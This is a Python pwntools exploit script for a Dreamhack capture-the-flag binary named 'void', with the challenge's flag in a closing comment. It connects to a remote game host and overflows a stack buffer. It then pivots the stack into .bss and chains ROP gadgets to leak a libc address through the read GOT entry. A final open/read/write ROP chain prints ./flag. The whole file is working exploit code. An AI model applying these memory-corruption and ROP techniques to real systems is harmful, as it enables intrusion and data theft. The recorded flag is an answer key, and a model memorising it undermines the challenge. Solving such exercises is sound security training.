#!/usr/bin/env python3

from pwn import *

exe = ELF('./void_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
# read
b *0x401428
# scanf
b *0x401410
'''

p = remote("host8.dreamhack.games", 18608)
#p = process('./void_patched')
#p = gdb.debug('./void_patched', gdbscript = script)
## sleep 3 when gdb, sleep .5 when remote

main_read = 0x401415
pop_rsi = 0x4013af
pop_rdx = 0x40138f
main = 0x4013D6
add_gadget = 0x40121c
leave_ret = 0x401455
add_qwordptr_r15_rdx_leave_ret = 0x401449
read_plt = exe.plt['read']
pop_rbp = 0x40121d

# pivot things so both rsp and rbp in bss
sl(b"256")
sleep(.5)
payload = b"A" * 0x5c + p32(0x31337) # rdi (fd)
payload = payload.ljust(0x70, b"A")
payload += p64(0x404a00) + p64(main_read) # saved rbp && saved rip
payload = payload.ljust(0x90, b"A")
s(payload)
payload = b"A" * 0x5c + p32(0x31337) # rdi (fd)
payload = payload.ljust(0x70, b"A")
payload += p64(0x404b00) + p64(main) # saved rbp && saved rip
payload = payload.ljust(0x90, b"A")
s(payload)

# create left over ptr in bss
sl(b"256")
## done
## 0x4041a0:       0x7f4bdc30da00 <_IO_helper_jumps>       0x7f4bdc184cb6 <_IO_new_file_underflow+390>
sleep(.5)
prerop = p64(0x404b00 - 0x70 + 0x20) + p64(pop_rdx)
prerop += p64(0x87d6a) + p64(add_qwordptr_r15_rdx_leave_ret)
prerop += p64(0x404d00) + p64(pop_rsi)
prerop += p64(0x404b00 - 0x70 + 0x50) + p64(pop_rdx)
prerop += p64(0x30) + p64(read_plt) # when execute read_plt, we input a ROP to conitnue control flow (already padding register)
prerop = prerop.ljust(0x5c, b"0")
payload = prerop + p32(0x31336) # rdi (fd)
payload = payload.ljust(0x68, b"0")
payload += p64(0x4041a8) # r15
payload += p64(0x404b00 - 0x70) + p64(leave_ret) # saved rbp && saved rip
payload = payload.ljust(0x90, b"0")
s(payload)

# now [0x4041a8] is write function
# read from prerop (rdi = 0, rdx = ... after execute read_plt)
# prepare a ROP after write (0x4041a8), ROP at 0x4041b0
# then set rdi = 1, rsi = got, rdx = n then call pivot to write to leak, only can set rdi via main_read (fck)
payload = b"" # start from 0x404ae0
payload += p64(pop_rsi) + p64(0x4041b0) + p64(read_plt) # to set up aftwerwrop
payload += p64(main_read) # to set up rdi and pivot to leak
payload += p64(0x404e00) + p64(main_read) # final rop after leak
s(payload)

# read from read_plt from above payload
afterwrop = p64(pop_rbp) + p64(0x404ae0 + 0x20) + p64(leave_ret)
afterwrop = afterwrop.ljust(0x30, b"A")
s(afterwrop)

# read from main_read from above payload
## this will set up rdi, rsi, rdx and pivot to prepare write function at 0x4041a8 -> leak
prerop = p64(0x404d00) + p64(pop_rsi)
prerop += p64(exe.got['read']) + p64(pop_rdx)
prerop += p64(8) + p64(pop_rbp)
prerop += p64(0x4041a0) + p64(leave_ret)
prerop = prerop.ljust(0x5c, b"1")
payload = prerop + p32(0x31337) # rdi (fd)
payload = payload.ljust(0x68, b"1")
payload += p64(0x404010) # padding the r15
payload += p64(0x404d00 - 0x70) + p64(leave_ret)
payload = payload.ljust(0x90, b"1")
s(payload)

# leak libc
libc_base = u64(p.recv(8)) - libc.symbols['read']
lleak("libc_base", libc_base)
open_func = libc_base + libc.symbols['open']
read = libc_base + libc.symbols['read']
write = libc_base + libc.symbols['write']
pop_rdi = libc_base + 0x000000000002a3e5
xchg_edi_eax = libc_base + 0x000000000014a385
pop_rax = libc_base + 0x0000000000045eb0
syscall_ret = libc_base + 0x91396 

# final rop after leak, orw
prerop = b"X" * 8 + p64(pop_rdi)
prerop += p64(0) + p64(pop_rsi)
prerop += p64(0x404e00 - 0x70 + 0x40) + p64(pop_rdx)
prerop += p64(0x1000) + p64(read)
prerop = prerop.ljust(0x5c, b"2")
payload = prerop + p32(0x31337) # rdi (fd)
payload = payload.ljust(0x68, b"2")
payload += p64(0x404010) # padding the r15
payload += p64(0x404e00 - 0x70) + p64(leave_ret)
payload = payload.ljust(0x90, b"2")
s(payload)

# orw rop
orw = b"" # start from 0x404e00 - 0x70 + 0x40 = 0x404dd0
orw += p64(pop_rdi) + p64(0x404dd0 + 16 * 0x8) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall_ret) # open("./flag", 0)
orw += p64(xchg_edi_eax) + p64(pop_rsi) + p64(0x404010) + p64(pop_rdx) + p64(0x100) + p64(read) # read(fd, 0x404010, 0x100)
orw += p64(pop_rdi) + p64(1) + p64(write)
orw += b"./flag\x00"
s(orw)

p.interactive()
#DH{e0af5d20b49b6dcedcd6fd480eb04e5cb2068fad85cdd861671b2d6327350b2b}